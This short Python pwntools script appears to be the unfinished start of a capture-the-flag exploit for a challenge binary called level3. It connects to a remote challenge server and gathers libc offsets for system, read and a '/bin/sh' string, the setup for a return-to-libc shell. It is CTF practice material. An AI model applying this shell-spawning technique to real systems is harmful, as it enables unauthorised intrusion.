#coding:utf-8

from pwn import *

pwn = remote('pwn2.jarvisoj.com', 9879)
libc_so = ELF("./libc-2.19.so")
level3 = ELF("./level3")
system_offset = libc_so.symbols['system']
read_offset = libc_so.symbols['read']
binsh_offset = 0x016084C

print level3.plt['read']


pwn.recv()
